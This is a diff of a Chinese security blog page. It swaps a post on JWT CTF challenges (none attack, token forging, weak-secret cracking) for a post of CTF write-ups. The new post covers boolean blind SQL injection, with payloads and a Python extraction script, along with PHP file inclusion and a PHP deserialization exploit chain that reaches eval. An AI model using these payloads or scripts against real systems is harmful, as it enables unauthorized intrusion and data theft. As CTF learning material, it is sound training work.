@@ -19,23 +19,23 @@
   <meta name="author" content="suny">
   <meta name="keywords" content="">
   
-    <meta name="description" content="参考知识JWT基础知识 JWT CTF实战 [PCTF] Jwt_password_manager 题目提示仪表盘支持jwt认证，代码发现提示flag在admin用户中 先注册一个普通用户拿到token，再结合secret_key修改权限  修改token拿到flag  [BaseCTF2024] NO JWT首先审计代码，发现&#x2F;login和&#x2F;flag路径 打开&#x2F;fl">
+    <meta name="description" content="error_sql本来看了描述还以为是报错注入结果进去才发现只回显是否查询成功，典型的布尔盲注 吸取上次的教训先测一下WAF，好吧没有 11&#x27; and length(database())&#x3D;10 and &#x27;1&#x27;&#x3D;&#x27;1  确定数据库名长度 11&#x27; and substr(database(),1,1)&#x3D;&#x27;t&#x27; and &#x27;1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JWT详解">
-<meta property="og:url" content="https://www.sunynov.top/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:title" content="训练场">
+<meta property="og:url" content="https://www.sunynov.top/2026/01/04/%E8%AE%AD%E7%BB%83%E5%9C%BA/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="参考知识JWT基础知识 JWT CTF实战 [PCTF] Jwt_password_manager 题目提示仪表盘支持jwt认证，代码发现提示flag在admin用户中 先注册一个普通用户拿到token，再结合secret_key修改权限  修改token拿到flag  [BaseCTF2024] NO JWT首先审计代码，发现&#x2F;login和&#x2F;flag路径 打开&#x2F;fl">
+<meta property="og:description" content="error_sql本来看了描述还以为是报错注入结果进去才发现只回显是否查询成功，典型的布尔盲注 吸取上次的教训先测一下WAF，好吧没有 11&#x27; and length(database())&#x3D;10 and &#x27;1&#x27;&#x3D;&#x27;1  确定数据库名长度 11&#x27; and substr(database(),1,1)&#x3D;&#x27;t&#x27; and &#x27;1">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/6961078a14866864fecd3f38.png">
-<meta property="article:published_time" content="2025-12-29T12:26:02.000Z">
-<meta property="article:modified_time" content="2026-01-09T13:50:32.640Z">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/696107f314866864fecd3f44.png">
+<meta property="article:published_time" content="2026-01-04T08:43:03.000Z">
+<meta property="article:modified_time" content="2026-02-05T13:25:40.484Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6961078a14866864fecd3f38.png">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/696107f314866864fecd3f44.png">
   
   
   
-  <title>JWT详解 - suny</title>
+  <title>训练场 - suny</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -224,7 +224,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="JWT详解"></span>
+            <span id="subtitle" data-typed-text="训练场"></span>
           
         </div>
 
@@ -240,8 +240,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-12-29 20:26" pubdate>
-          2025年12月29日 晚上
+        <time datetime="2026-01-04 16:43" pubdate>
+          2026年1月4日 下午
         </time>
       </span>
     
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          389 字
+          487 字
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          4 分钟
+          5 分钟
         
       </span>
     
@@ -300,12 +300,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">JWT详解</h1>
+            <h1 id="seo-header">训练场</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年1月9日 晚上
+                    本文最后更新于 2026年2月5日 晚上
                   
                 
               </p>
@@ -313,40 +313,36 @@
             
               <div class="markdown-body">
                 
-                <h3 id="参考知识"><a href="#参考知识" class="headerlink" title="参考知识"></a>参考知识</h3><p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">JWT基础知识</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinghaihe/p/19083689">JWT CTF实战</a></p>
-<h3 id="PCTF-Jwt-password-manager"><a href="#PCTF-Jwt-password-manager" class="headerlink" title="[PCTF] Jwt_password_manager"></a>[PCTF] Jwt_password_manager</h3><p> 题目提示仪表盘支持jwt认证，代码发现提示flag在admin用户中</p>
-<p>先注册一个普通用户拿到token，再结合secret_key修改权限</p>
-<p><img src="https://pic1.imgdb.cn/item/69586e0f912e73dbe6128973.png" srcset="/img/loading.gif" lazyload></p>
-<p>修改token拿到flag</p>
-<p><img src="https://pic1.imgdb.cn/item/69586e23912e73dbe6128977.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="BaseCTF2024-NO-JWT"><a href="#BaseCTF2024-NO-JWT" class="headerlink" title="[BaseCTF2024] NO JWT"></a>[BaseCTF2024] NO JWT</h3><p>首先审计代码，发现&#x2F;login和&#x2F;flag路径</p>
-<p>打开&#x2F;flag发现要校验身份，那就先去&#x2F;login获取令牌，根据提示随便传入一个json</p>
-<p><img src="https://pic1.imgdb.cn/item/69587856912e73dbe6128c46.png" srcset="/img/loading.gif" lazyload></p>
-<p>代码中没有secret_key，但是在后面也没有校验签名，所以采用none攻击</p>
-<p><img src="https://pic1.imgdb.cn/item/6958783c912e73dbe6128c0f.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="CTFshow-抽老婆"><a href="#CTFshow-抽老婆" class="headerlink" title="[CTFshow] 抽老婆"></a>[CTFshow] 抽老婆</h3><p>下载图片发现download后门</p>
-<p><img src="https://pic1.imgdb.cn/item/6958b179da3df73ea1bbfd4e.png" srcset="/img/loading.gif" lazyload></p>
-<p>仔细观察发现是python flask框架，尝试下载app.py，成功</p>
-<p>审计代码发现&#x2F;secret_path_U_never_know路径，但是还需要绕过身份验证</p>
-<p>只需要让session中的isadmin为真就可，这个用的是JWT方式认证，将isadmin的值更改后，使用密钥SECRET_KEY重新加密生成一个session。</p>
-<p><img src="https://pic1.imgdb.cn/item/6958b210da3df73ea1bbfe7b.png" srcset="/img/loading.gif" lazyload></p>
-<p>使用hackbar传入即可</p>
-<h3 id="CTFHub-弱签名"><a href="#CTFHub-弱签名" class="headerlink" title="[CTFHub]弱签名"></a>[CTFHub]弱签名</h3><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，我们可以直接通过蛮力攻击方式来破解密钥</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litluo/p/c-jwt-cracker.html">快速安装 c-jwt-cracker</a></p>
-<p><img src="https://pic1.imgdb.cn/item/695a32c4bee82fbf891bf50f.png" srcset="/img/loading.gif" lazyload></p>
-<p>由此我们便得到了密钥hnqx</p>
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>1.如何判断签名校验</p>
-<p>在Jwt_password_manager中，有一个校验签名的函数，并且在用户名赋值时调用了校验函数</p>
-<p><img src="https://pic1.imgdb.cn/item/695a2ed9bee82fbf891bf308.png" srcset="/img/loading.gif" lazyload></p>
-<p>但是在no_jwt中不进行签名验证和过期验证，仅对 JWT 令牌进行解码</p>
-<p><img src="https://pic1.imgdb.cn/item/695a2fccbee82fbf891bf386.png" srcset="/img/loading.gif" lazyload></p>
-<p>因此可以使用none攻击</p>
-<p>2.如何判断网站是python写的</p>
-<ul>
-<li>查看请求头的server信息</li>
-<li>看网站后缀名</li>
-</ul>
+                <h2 id="error-sql"><a href="#error-sql" class="headerlink" title="error_sql"></a>error_sql</h2><p>本来看了描述还以为是报错注入结果进去才发现只回显是否查询成功，典型的布尔盲注</p>
+<p>吸取上次的教训先测一下WAF，好吧没有</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and length(database())=<span class="hljs-number">10</span> and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>确定数据库名长度</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;t&#x27; and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>爆数据库名 terra_data</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>
+
+<p>爆表名 secret</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span>=database() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;secret&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;i&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>
+
+<p>爆字段名 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://124.221.168.69:20328/search&#x27;</span><br>str_range = <span class="hljs-string">&#x27;&#125;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br>headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJzdW4ifQ.aWM0dw.jbcwlk8_tGVJkxk2aIVqJXRFhVc&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getData</span>(<span class="hljs-params">str_list</span>):<br>    j = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str_list:<br>            new_url = url + <span class="hljs-string">f&quot;?id=1&#x27; and substr((select group_concat(flag) from secret),<span class="hljs-subst">&#123;j&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span><br>            r = requests.get(new_url,headers=headers)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;成功查询&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&#125;&quot;</span>:<br>                    <span class="hljs-built_in">print</span>()<br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        j = j + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getData(str_range)<br></code></pre></td></tr></table></figure>
+
+<p>脚本爆flag</p>
+<h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI_2_?"></a>LFI_2_?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//read file only :)</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>描述：allow_url_include Off</p>
+<p>这里我们复习一下</p>
+<p>对include而言，它会包含并运行指定文件中的代码，并且php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;依赖allow_url_include On</p>
+<p>而file_get_contents，它只是一个“数据搬运工”，不会解析或执行其中的PHP代码，并且php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;依赖allow_url_fopen On</p>
+<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p><img src="https://pic1.imgdb.cn/item/69634f1b75db907620f2687a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="seria-anonymous"><a href="#seria-anonymous" class="headerlink" title="seria_anonymous"></a>seria_anonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animals</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Sakiko</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uika</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; Sakiko = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>            <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;<br>            <br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; handle = <span class="hljs-string">&quot;mutsumi&quot;</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mutsumi</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span> -&gt; handle  !== <span class="hljs-string">&quot;mutsumi&quot;</span>) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoNoNo&lt;br&gt;&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;anything&#x27;</span>] ?? <span class="hljs-string">&quot;echo &#x27;来控制我呀~&#x27;;&quot;</span>);<br>            &#125;<br>        &#125;;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span> -&gt; uika;<br>        <span class="hljs-variable">$func</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure>
+
+<p>主要考察匿名类</p>
+<p>将数组的第一个值指向另一个Animals实例的Sakiko地址，从而调用mutsumi方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animals</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Sakiko</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uika</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animals</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animals</span>();<br><br><span class="hljs-variable">$a</span> -&gt; Sakiko = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span> -&gt; uika = [<span class="hljs-variable">$a</span>, <span class="hljs-string">&quot;__construct&quot;</span>];<br><span class="hljs-variable">$b</span> -&gt; uika = [&amp;<span class="hljs-variable">$a</span> -&gt; Sakiko , <span class="hljs-string">&quot;mutsumi&quot;</span>];<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -385,8 +381,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>JWT详解</div>
-      <div>https://www.sunynov.top/2025/12/29/JWT详解/</div>
+      <div>训练场</div>
+      <div>https://www.sunynov.top/2026/01/04/训练场/</div>
     </div>
     <div class="license-meta">
       
@@ -398,7 +394,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年12月29日</div>
+          <div>2026年1月4日</div>
         </div>
       
       
@@ -430,9 +426,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/01/04/%E8%AE%AD%E7%BB%83%E5%9C%BA/" title="训练场">
+                      <a href="/2026/01/07/%E6%B5%85%E8%B0%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" title="浅谈无字母数字RCE">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">训练场</span>
+                        <span class="hidden-mobile">浅谈无字母数字RCE</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -440,8 +436,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞">
-                        <span class="hidden-mobile">PHP反序列化漏洞</span>
+                      <a href="/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/" title="JWT详解">
+                        <span class="hidden-mobile">JWT详解</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
